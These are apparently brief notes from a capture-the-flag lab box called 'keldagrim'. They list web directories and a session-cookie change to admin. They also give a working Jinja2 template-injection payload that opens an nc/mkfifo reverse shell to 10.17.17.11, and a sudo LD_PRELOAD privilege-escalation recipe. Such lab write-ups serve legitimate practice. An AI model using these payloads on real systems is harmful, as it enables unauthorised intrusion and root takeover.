# keldagrim
web directories: /wow,  /OSRunescape, /[runescape, /admin](#root/AIB284Wkwuq7)

Jed, jad

base64 session cookie, change to admin

SSTI Exploit
------------

`{{ ''.__class__.__mro__[1].__subclasses__()[401]("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.17.17.11 9999 >/tmp/f", shell=True, stdout=-1).communicate() }}`

nc mkfifo shell is most effective

**Privesc:**
------------

`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

`sudo LD_PRELOAD=/tmp/shell.so <sudo binary>`